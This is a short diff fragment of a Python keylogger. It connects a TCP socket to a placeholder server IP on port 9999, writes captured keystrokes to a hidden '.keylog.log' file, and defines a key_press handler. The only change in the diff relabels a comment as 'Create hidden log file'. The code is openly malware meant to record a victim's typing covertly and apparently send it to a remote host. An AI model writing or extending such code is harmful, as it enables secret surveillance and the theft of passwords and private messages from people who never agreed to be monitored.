@@ -9,7 +9,7 @@ clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
 # Enter SERVER IP
 clientSocket.connect(("[SERVER IP]",9999));
 
-# Create the file
+# Create hidden log file
 logging.basicConfig(filename=".keylog.log", level=logging.INFO)
 
 def key_press(event):
